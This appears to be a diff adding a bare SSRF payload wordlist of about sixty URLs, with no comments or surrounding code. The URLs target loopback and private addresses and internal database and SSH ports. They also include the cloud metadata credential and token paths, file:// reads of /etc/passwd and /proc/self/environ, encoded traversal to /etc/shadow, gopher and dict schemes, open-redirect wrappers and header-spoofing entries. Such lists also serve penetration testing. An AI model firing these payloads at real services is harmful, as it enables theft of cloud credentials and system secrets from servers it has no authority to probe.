@@ -1,0 +1,62 @@
+http://localhost:80
+http://127.0.0.1:8080
+http://169.254.169.254/latest/meta-data/
+http://example.com
+http://0.0.0.0:8080
+http://::1
+http://[::1]:80
+http://192.168.1.1
+http://10.0.0.1
+http://172.16.0.1
+GET http://localhost:80
+POST http://localhost:80
+PUT http://localhost:80
+DELETE http://localhost:80
+http://localhost%2Fetc%2Fpasswd
+http://127.0.0.1%2Fadmin
+http://127.0.0.1%3A80
+http://192.168.1.1%3A22
+http://localhost
+http://127.0.0.1
+http://localhost:3000
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/
+http://localhost:22
+http://localhost:3306
+http://localhost:5432
+http://localhost:6379
+file:///etc/passwd
+file:///proc/self/environ
+file:///dev/null
+http%3A%2F%2Flocalhost%3A80
+http%3A%2F%2F127.0.0.1%3A8080
+http://your-redirect-url.com?url=http://localhost
+http://your-redirect-url.com?url=http://169.254.169.254
+http://random-subdomain.localhost
+http://test.localhost
+http://192.168.1.255
+http://192.168.0.1
+http://10.0.0.255
+ftp://localhost
+gopher://localhost:70
+dict://localhost
+http://localhost/api/v1/user
+http://127.0.0.1/api/status
+http://localhost:8000/debug
+http://localhost:5000/debug
+http://example.com/admin
+http://localhost:9999
+http://169.254.169.254
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/api/token
+http://localhost./
+http://localhost/../etc/passwd
+http://127.0.0.1:80/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc/passwd
+http://localhost/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc/shadow
+http://[::1]:80
+http://[::ffff:127.0.0.1]:80
+http://mailto:test@example.com
+sip:test@localhost
+http://localhost:80/ -H "Host: vulnerable.com"
+http://localhost:80/ -H "X-Forwarded-For: 127.0.0.1"
